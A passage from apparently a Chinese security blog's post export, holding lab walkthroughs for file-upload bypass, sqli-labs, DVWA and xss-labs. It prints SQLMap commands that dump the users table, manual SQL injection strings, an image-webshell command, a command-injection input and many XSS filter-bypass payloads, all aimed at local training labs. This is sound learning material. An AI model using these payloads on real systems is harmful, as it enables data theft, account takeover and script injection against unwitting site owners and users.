字符（\\x00），来绕过字符串截断等安全措施，导致应用程序执行意外的操作或暴露敏感信息。 十三、后缀检测-POST方式00截断 GET 会自行解码%00，POST 不会自行解码 十四、内容检测-文件头检测绕过 检测文件头，源码会根据图片的*前两个字节*来判定文件类型，所以需要把 webshell 的后缀改为图片格式 制作图片木马 copy code.jpg /b + code.php /a webshell.jpg 十五、内容检测-getimagesize()函数 getimagesize()函数来验证是否是图片。依旧是生成带有 php 代码的图片，进行上传 十六、内容检测-exif_imagetype()函数 使用exif_imagetype函数来检查是否是图片，读取图像的第一个字节并检查其签名。依旧是生成带有 php 代码的图片，进行上传 十七、内容检测-图片二次渲染绕过 图片的二次渲染会把第一次渲染添加的 PHP 代码删掉。 绕过的方式是，查看*图片的渲染后没有修改的位置*，添加一句话木马 未完待续……","tags":["文件上传"],"categories":["网络安全"]},{"title":"sqli-labs 靶场使用 SQLMap 注入（1-25 关）","path":"/2023/02/28/sqli-labs-SQLMap/","content":"注意点： sqlmap 需要 python 的环境，并配置环境变量 在实际检测过程中，sqlmap 会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数--batch命令来自动答复和判断 用 sqlmap 工具注入完毕后，C 盘 AppData 文件夹下会有缓存文件夹，不删掉的话会影响 SQL 注入结果C:\\Users\\20846\\AppData\\Local\\sqlmap\\output，也可用sqlmap.py --purge来清空缓存 Less-1 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --batch --banner # --batch 从不询问用户输入，使用所有默认配置，换言之对所有的交互式的都是默认的 # -b, --banner 获取数据库管理系统的标识 # 查看数据库 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --dbs 爆出数据库名 # sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库中的所有表 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security --tables 查询 security 数据库中的所有表 # sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库中指定表的所有列(字段) python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns 查看 security 数据库下的 users 表里都有哪些字段 # sqlmap -u -D security -T users -C id,password,username --dump # 爆出数据库 security 中的 users 表中的 id,password,username 列中的所有数据 python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users -C id,password,username --dump # --dump 将结果保存下来 查看列字段的具体值 因此，只要能找到注入点和数据库，就算上成功了 Less-2 以下操作都是基于 Less-1 的步骤，如法炮制而来 sqlmap -u http://localhost/sqli-labs/Less-2/?id=1 --batch --dbs 找到数据库 Less-3 sqlmap -u http://localhost/sqli-labs/Less-3/?id=1 --batch --dbs Less-4 sqlmap -u http://localhost/sqli-labs/Less-4/?id=1 --batch --dbs Less-5 sqlmap -u http://localhost/sqli-labs/Less-5/?id=1 --batch --dbs Less-6 sqlmap -u http://localhost/sqli-labs/Less-6/?id=1 --batch --dbs Less-7 sqlmap -u http://localhost/sqli-labs/Less-7/?id=1 --batch --dbs Less-8 sqlmap -u http://localhost/sqli-labs/Less-8/?id=1 --batch --dbs Less-9 sqlmap -u http://localhost/sqli-labs/Less-9/?id=1 --batch --dbs Less-10 sqlmap -u http://localhost/sqli-labs/Less-10/?id=1 -level=2 --batch --dbs # 当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入 Less-11 sqlmap -u http://localhost/sqli-labs/Less-11/index.php --batch --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs # 从该关开始，注入的位置不再是 URL，且请求变为了 POST，因此命令要随之而变。对于是 post 提交数据的 URL，需要指定其 data 参数，--data 能够抓取其 post 提交的数据填入 # 还有一种方法是：因为 Less-11 该关需要进行登录，可以先用账号 admin 密码 admin 登录，然后用 burp 抓包，将 burp 抓取的包保存为 target.txt，利用 sqlmap -r target.txt 命令，来探测 target.txt 文件中的 http 数据包是否存在 sql 注入漏洞 sqlmap -r target.txt Less-12 sqlmap -u http://localhost/sqli-labs/Less-12/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-13 sqlmap -u http://localhost/sqli-labs/Less-13/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-14 sqlmap -u http://localhost/sqli-labs/Less-14/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-15 sqlmap -u http://localhost/sqli-labs/Less-15/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs --batch 以下略去 Less-16 sqlmap -u http://localhost/sqli-labs/Less-16/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs --level=2 Less-17 sqlmap -u http://localhost/sqli-labs/Less-17/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-18 # 注入的位置在 User-Agent 中 sqlmap -u http://localhost/sqli-labs/Less-18/ --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --user-agent=&quot;*&quot; --thread=10 --dbs # --thread=10，设置多线程，并行处理请求加快效率 # --user-agent=&quot;*&quot; 是用来指定 User-Agent Less-19 # 注入的位置在 Referer 中 sqlmap -u &quot;http://localhost/sqli-labs/Less-19/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --referer=&quot;*&quot; --thread=10 --dbs # --referer，伪造 referer 字段 Less-20 # 注入的位置在 cookie 中 sqlmap -u http://localhost/sqli-labs/Less-20/index.php --cookie=&quot;uname=admin&quot; --dbs --batch --level=5 --risk=3 # 同样，可以用 burp 抓包保存 ，殊途同归，第一次失败了，于是提高了线程，这将导致查询速度降低 sqlmap -r target-20.txt --leve=5 --risk=3 --dbs Less-21 # 注入的位置依旧在 cookie 中，但经过了 base64 加密的，用 sqlmap 来进行联合查询注入 sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --tamper=&quot;base64encode&quot; --dbms=MySQL --random-agent --flush-session --technique=U --dbs --batch -v 3 # --random-agent --&gt; 使用任意的User-Agent爆破 # --flush-session --&gt; sqlmap 扫描的时候会将缓存的数据记录到 output 文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加 --flush-session 选项。 # --dbms=MySQ --&gt; 指定其数据库为mysql # --tamper base64encode --&gt; 对提交的数据进行base64编码 # --technique=U --&gt; 指定注入点类型，u 是指的 union 联合查询注入。其他还有 U/B/T/S # -v --&gt; 3 能看到 payload Less-22 sqlmap -u http://localhost/sqli-labs/Less-22/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch Less-23 sqlmap -u http://localhost/sqli-labs/Less-23/?id=1 --dbs --batch Less-24 # 这关是二次注入，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。 # 需要先注册账号 admin'#，然后修改密码，后面的 # 号注释掉了 # Sql 语句变为 UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =' admin' # ' AND password=' Less-25 sqlmap -u http://localhost/sqli-labs/Less-25/?id=1 --dbs --batch","tags":["SQL注入"],"categories":["网络安全"]},{"title":"sqli-labs 靶场（手工注入）","path":"/2023/02/28/sqli-labs/","content":"前言 参考： SQLI labs 靶场精简学习记录 https://github.com/Audi-1/sqli-labs 工具方面可用老版本的 Hackerbar，以及抓包工具 Burpsuite Less-1 可先查看数据库的记录次数 一直增大 id 的值，当 id 的值大于 14，得到的是一个没有用户名和密码的空白页面，这意味着数据库只有 14 条记录 ?id=1 …… ?id=14 但是我们并不知道开发者具体是怎样封装 id 参数值的。所以得先找封装形式 使用基于错误返回的 SQL 注入，单引号'或者转义符\\ 通过转义字符来找出 参数封装形式，在MYSQL中 ''(反斜杠)被用来转义一个字符。转义一个字符意味着取消该字符的特殊用途。使用转义字符可以得到更清楚的图片。 ?id=1' ?id=1\\ less-1 到 less-4 的封装形式 破坏查询的同时，用--+修复它的语法错误，-- 是 SQL 的注释语句 输入 1'--+ 或者输入 1'--%20（%20 URL编码为空格） 或者输入 1'%23 （%23 URL编码为 # ） SELECT * from table_name WHERE id='1'--+' LIMIT 0,1 使用联合查询 接下来在引号和 --+ 之间添加查询来获取数据库中的信息 通过order by 1来查询有几列，之所以需要知道数据库有几列是因为联合查询 union 规定的，得知总共有 3 列 ?id=1' order by 1 --+ --&gt; 返回正确 ?id=1' order by 4 --+ --&gt; 返回错误 -- UNION，没有错误 ?id=1' union select 1,2,3 --+ SELECT * from table_name WHERE ?id='1' union select 1,2,3 --+' 但是我们得到的是第一个查询的结果集，为了将第二个查询的结果显示在屏幕上，我们必须将第一条查询的结果集置为EMPTY。这点可通过给定 id 一个不存在的值来实现。我们可以将 id 的值设为负或者大于14，因为前面已经发现了数据库中只有14条记录。 union ?id=-1' union select 1,2,3 --+ 或者 ?id=15' union select 1,2,3 --+ SELECT * from table_name WHERE ?id='-1' union select 1,2,3 --+' 数据库的版本信息 -- 数据库的版本信息 ?id=-1' union select 1,2,version() --+ -- 正在使用的数据库信息和当前后端所使用的数据库的版本信息 ?id=-1' union select 1,database(),version() --+ 基于错误返回的SQL查询 基于联合查询的SQL注入 为了让联合注入工作，首先要知道数据库中的表名，键入 id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ -- 拆解 id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ Your Login name:emails,referers,uagents,users Your Password:3 注入 联合查询 ?id=-1'+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ ?id=-1'+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ 报错注入 ?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ ?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ — 未完待续","tags":["SQL注入"],"categories":["网络安全"]},{"title":"DVWA 靶场","path":"/2023/02/26/DVWA-master/","content":"参考： 小白网络安全入门之_DVWA全系列_哔哩哔哩_bilibili DVWA通关教程（上） DVWA 入门靶场学习记录 前言 https://github.com/digininja/DVWA 模块大榄 Brute Force（暴力破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA（不安全的验证码） SQL Injection（SQL注入） SQL Injection (Blind)（SQL盲注） XSS (Reflected)（反射型跨站脚本） XSS (Stored)（存储型跨站脚本） DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容 通关开始 第一关-Brute Force LOW PHP 代码——查询验证用户名和密码 $query = &quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';&quot;; PHP 代码——登录前的验证 # 请求不为空，查得到结果就行 if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; # 输出头像和用户名 $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; &#125; else &#123; 登录失败 &#125; SQL 在登录框中输入 admin' or '1' = '1 admin' or '1' = '2 SELECT * FROM `users` WHERE user = 'admin' or '1'='1' AND password = '' -- or 一个为真，即可为真 Medium PHP 代码 $user = mysql_real_escape_string( $user ); 单引号没有了，变成了转义\\ GET /DVWA-master/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login HTTP/1.1 High 多了token这个参数，过滤低级的爆破，校验 先抓包，火狐浏览器地址栏是明文的 GET /DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65 HTTP/1.1 多了这一段 &amp;user_token=1884203513ab2b438bc4ec3182f62a65 点击 intercept is on 变成了 intercept is off 紧接着看网站浏览器的地址栏 http://localhost/DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65# 接着开始改 Python 脚本 第二关-Command Injection LOW php 代码 &lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 网页输入 127.0.0.1 &amp;&amp; ipconfig Medium High 第三关-CSRF 跨站请求伪造，有人戏谑为借刀杀人，借用户之刀，做恶行之事也 LOW 映入眼帘的是一个修改密码的界面，输入密码之后123 123 后，在地址栏中观察到 从而得知这是 GET 型提交，且这就是修改密码的链接。我们直接在地址栏中修改密码456，然后复制链接重新打开一个界面（需要注意的是，打开的界面必须在同一个浏览器，原因是 cookie 认证） 如图所示显示密码已更改，同时原密码123失效了。 但显然，长而冗杂的链接是令人厌烦的，诱导用户点击的话，可以通过构造短链接的形式，直接搜索“在线 短链接”即可找到 如何查看重定向之前的链接呢，可以借用curl -i url Medium 和 Low 级别相比，增添了 referer 判断。 referer 作为 HTTP 头中的一个字段，记录了 HTTP 请求的来源地址。 通过输入密码 123，通过 burp 抓包看看。 重复上次的操作，重新打开一个界面，在 burp 中进行抓包，发现没有 referer 字段 接下来可以在 burp 中手动伪造 referer 来执行 CSRF 攻击 Referer: http://localhost/DVWA-master/vulnerabilities/csrf/ High 增加了 token 机制，当用户往服务器发送请求的时候，服务器通过校验请求是否携带正确的 Token，才会响应请求。 因为 GET 请求的参数会暴露在 URL 中，所以输入密码之后查看一下 token 第十关-XSS (DOM) Low document.write(&quot;&lt;option value='&quot; + lang + &quot;'&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;&quot;); // payload ?default=English &lt;script&gt;alert('XSS')&lt;/script&gt; Medium if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; // stripos() 函数 --&gt; 查找 &quot;&lt;script&quot; 在字符串（default 变量）中第一次出现的位置： // header函数 --&gt; Location类型的标头是一种特殊的header调用，常用来实现页面跳转。匹配通过将跳转 ?default=English // input 事件，制造一个 input 输入框，当 onclick 点击的时候触发 xss 攻击 ?default=English&lt;input onclick=alert('XSS') /&gt; High if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; # White list the allowable languages switch ($_GET['default']) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; // switch 语句 --&gt; 有选择地执行若干代码块之一 // !is_null --&gt; 检测变量是否不为 NULL。 // 如果 default 变量的值不为 French、English……这些，default 变量就重置为 ?default=English // 闭合 option 和 select 标签，然后使用 # 来注释 ?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert('XSS')&gt; ?default=English#&lt;input onclick=alert('XSS') /&gt; 第十一关-XSS (Reflected) LOW // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user $html .= '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; // 从源代码中可看到没有对 name 做其他限制，只检测了 != null 且变量存在 // payload &lt;script&gt;alert('XSS')&lt;/script&gt; Medium if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // 从源代码中可以看到 &lt;script&gt; 标签进行了过滤，那就换个标签 // payload &lt;img src=x onerror=alert('XSS')&gt; High '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i' // 正则表达式过滤，script 不区分大小写，并且使用了通配符 * 匹配 // payload &lt;img src=x onerror=alert('XSS')&gt; 第十二关-XSS (Stored) LOW // payload Name: 1 Message: &lt;script&gt;alert('XSS')&lt;/script&gt; -- 从数据库中查看 mysql -u root -proot SHOW DATABASES; USE `dvwa` select * from guestbook; delete from guestbook; Medium // payload Name: &lt;Script&gt;alert('XSS')&lt;/script&gt; Message: www.sqlsec.com Name: &lt;s&lt;script&gt;cript&gt;alert('XSS')&lt;/script&gt; Message: www.sqlsec.com High // payload Name: &lt;img src=x onerror=alert('XSS')&gt; Message: www.sqlsec.com","tags":["DVWA"],"categories":["网络安全"]},{"title":"xss-labs","path":"/2023/02/21/xss-labs/","content":"do0dl3/xss-labs: xss 跨站漏洞平台 (github.com) level 1 观察地址栏得知是GET请求，参数是name，值为test 修改参数值定位位置，发现是在 h2标签内，判断为反射型xss 于是直接在把name参数赋值为： &lt;script&gt;alert('xss')&lt;/script&gt; 从浏览器观察直接弹出来了，查看一下源码，发现有一个str变量，值是name，同时str变量又被放在了h2标签中，且没做任何过滤处置。 $str = $_GET[&quot;name&quot;]; echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; level 2 从地址栏观察URL发现依旧是GET方式来传递参数，不言而喻是反射型XSS 使用第一关的&lt;script&gt;alert('xss')&lt;/script&gt;，发现并没有出现弹窗，查看页面源代码，发现在h2标签中，&lt;script&gt;的&lt;&gt;被HTML实体化了 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 但 input 标签中的 value 参数没有被 HTML 编码，于是用&quot;&gt;分别闭合value属性和input标签，最后用//注释后面的&quot;&gt; // payload &quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;// 最后在 less-2.php 中查看，发现标签h2之所以被编码，是因为有htmlspecialchars()函数，换言之在网页上输入的字符会经过htmlspecialchars()函数对其进行 HTML 实体才会展示在页面上。 htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。 $str = $_GET[&quot;keyword&quot;]; echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str.'&quot;&gt; 页面源代码 闭合在标签外构造 XSS level 3 修改参数值定位具体位置，发现和 level 2 是一样的，在h2和input标签中 顾忌到会有编码之类，使用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，然后 Ctrl + U 查看页面源代码。果不其然，与 level 2 不同的是，这关h2和input标签中的str变量皆难逃被编码之命 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 因为过滤了&lt;&gt;，这说明不可以用新标签，只能在标签内通过'闭合前面的属性的方式，为后面新增属性来绕过，与此同时想到的是“鼠标事件” // 用 ' 闭合 value 的值，新增点击事件，在 input 框中去点击一下即可触发 // 根据源码，闭合需用单引号 ' onclick ='javascript:alert(1)'// $str = $_GET[&quot;keyword&quot;]; echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword value='&quot;.htmlspecialchars($str).&quot;'&gt; 页面源代码 新增属性构造 XSS level 4 修改参数值定位具体位置，依旧是在h2和input标签中，用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，查看页面源代码，发现h2标签的参数依旧被 HTML 实体，仍然是&lt;&gt;字符 但与之前不同的是，input标签中的value属性的值，没有出现&lt;&gt;字符，所以还是用闭合属性新增鼠标事件的方式来绕过 &quot; onclick =&quot;javascript:alert(1)&quot;// 最后在 less-4.php 中查看，出现了str_replace() 函数 str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); --&gt; 在 str 变量中，将&lt;&gt;字符替换为空 htmlspecialchars() 函数 --&gt; 把一些预定义的字符转换为 HTML 实体。 $str = $_GET[&quot;keyword&quot;]; $str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); $str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str3.'&quot;&gt; 页面源代码 点击事件 level 5 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 script --&gt; scr_ipt 尝试&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 onclick --&gt; o_nclick 于是换一种思路，用&quot;&gt; 来闭合 input 标签，利用a标签的href属性可以执行 JavaScript 伪协议的特性，绕过众多检测 &quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;// // 看到还有一种方式，可直接触发 &quot;&gt;&lt;iframe src=javascript:alert(1)&gt; 最后在 less-5.php 中查看，出现了strtolower() 函数 strtolower() 函数 --&gt; 把字符串转换为小写，赋值给str变量，这样大小写绕过就失效了 str_replace --&gt; 加入了_破坏完整的字符 $str = strtolower($_GET[&quot;keyword&quot;]); $str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); $str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str3.'&quot;&gt; 测试一 测试二 JavaScript 伪协议 level 6 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，发现在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 尝试点击事件&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 试一下伪协议&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//，完整的href被_断开了 于是使用*大小写绕过* // 点击事件大小写绕过 &quot; ONCLICK =&quot;alert(1)&quot;// // 伪协议大小写绕过 &quot;&gt;&lt;a HREF=javascript:alert(1)&gt;xss&lt;/a&gt;// 查看 level6.php，可以看到 str_replace 函数分别破坏了&lt;script、on、src、data、href等元素。h2 标签处做了 HTML 实体 $str = $_GET[&quot;keyword&quot;]; $str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str); $str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2); $str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4); $str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str6.'&quot;&gt; level 7 通过测试，发现 input 标签的 value 属性的值 script、on、href被直接替代为了空，h2 标签依旧是 HTML 实体了 于是通过**双写绕过**的方式去绕过检测 // script &quot;&gt;&lt;scrscriptipt&gt;alert('xss')&lt;/scrscriptipt&gt; // href 和 script，伪协议 &quot;&gt; &lt;a hrhrefef=javascscriptript:alert(1)&gt;1&lt;/a&gt;// // 点击事件 &quot; oonnclick =&quot;javascscriptript:alert(1)&quot;// 查看 level7.php，可以看到 str_replace 函数分别把&lt;script、on、src、data、href替代为了空 h2 标签处做了 HTML 实体，strtolower()函数把字符串转换为小写 $str =strtolower( $_GET[&quot;keyword&quot;]); $str2=str_replace(&quot;script&quot;,&quot;&quot;,$str); $str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2); $str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3); $str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4); $str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form action=level7.php method=GET&gt; &lt;input name=keyword value=&quot;'.$str6.'&quot;&gt; level 8 定位一下，第一个参数在 input 标签的 value 属性中， 第二个参数在 a 标签的 href 属性中 通过测试，发现在 input 标签的 value 属性中&lt;&gt; &quot;被 HTML 编码了，a 标签的 href 属性把script、on、src、data、href用_截断了，同时&quot;被 HTML 编码了 使用大小写绕过也失败了，说明有 strtolower 函数。 因为第二个参数在 href属性中，而href属性支持构造伪协议，但script被_所限制，于是尝试用编码的方式去绕过 javascript:alert(1) &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; HTML 编码 HTML 编码 level 9 定位参数，第一个参数照旧，第二个参数还是在 a 标签的 href 属性中 用javascript:alert(1)测试，a 标签的 href 属性的值显示“您的链接不合法” 一般而言，href 属性是要填 URL 的，那就补上一个https://www.google.com 输入javascript:alert(1)//http://www.baidu.com，从页面源代码处看到script被_截断了，那就 HTML 编码一下 java&amp;#x73;cript:alert(1)//http://www.baidu.com // ｓ--&gt; &amp;#x73; 从 level9.php 可以观察到，如果没有http://字符，会输出链接不合法 if(false===strpos($str7,'http://')) &#123; echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;'; &#125; level 10 从 URL 处输入测试参数，然后 CTRL+U 查看页面源代码发现有三个 input 标签，且 type=“hidden”，也就是隐藏表单。 把三个 input 标签的类型修改为 text，看在页面的显示情况 // 发现页面出现文本框，t_sort，这证明可对其进行突破 text&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot; // 出现文本框后可直接注入 XSS 代码 &quot; type=&quot;text&quot; onclick=&quot;alert('xss') 从源码看把&lt;&gt;替换为空了，这恐怕只能在标签内部通过新增属性的方式来答题了 $str = $_GET[&quot;keyword&quot;]; $str11 = $_GET[&quot;t_sort&quot;]; $str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11); $str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22); echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt; &lt;form id=search&gt; &lt;input name=&quot;t_link&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;t_history&quot; value=&quot;'.'&quot; type=&quot;hidden&quot;&gt; &lt;input name=&quot;t_sort&quot; value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt; 隐藏表单 点击 input 框触发 xss level 11 查看源代码发现 t_ref 的 value 值为上道题的 URL，由此判断 value 值就是 referer，referer 用于告知服务器用户的来源页面，所以这道题直接篡改 referer 就可以了 referer:&quot;type=&quot;text&quot; onclick=&quot;alert('xss') 页面源代码 点击 input 框触发 xss 源码 level 12 CTRL+U 查看源代码发现 t_ua 的 value 值为 User-Agent，也就是用户代理，通常标识浏览器、及其版本号及其主机操作系统。 User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert('xss') User-Agent 点击 input 框触发 xss 源码 level 13 CTRL+U 查看源代码发现 t_cook 的 value 值为call me maybe?，使用浏览器插件 Cookie Editor 查看 cookie 的值与之相似，于是判定 value 值就是 cookie user=&quot; type=&quot;text&quot; onclick=&quot;alert('xss') 对比查看是 cookie 修改 cookie 点击 input 框触发 xss 源码 level 14 网页一直在响应，最终以失败告终，查看源码发现原链接已经失效 这关主要考察Exif，Exif 记录着照片的属性信息和拍摄数据，可以更改图片的参数把一张恶意的图片传到可执行该信息的网站 level 15 查看页面源码，最底部有一行 span 标签，class 属性是ng-include &lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt; 查询了一下得知是前端框架 angular js 里面的，含义是文件包含 于是可以把本地文件level1.php包含起来让其执行 XSS ?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;' level 16 用&lt;script&gt;alert('xss')&lt;/script&gt;测试，查看页面源代码，发现参数值在 center 标签中，而用于构造 XSS 的script、/、空格被替换为了&amp;nbsp; /被编码这意味着像是&lt;&gt;&lt;/&gt;需要闭合的标签用不了，所以想到了&lt;img&gt;这种自闭和的标签 换行符 --URL编码后--&gt; %0a // 直接输入发现“空格”被替换为了 &amp;nbsp; 因此考虑用 %0a 即换行符绕过空格 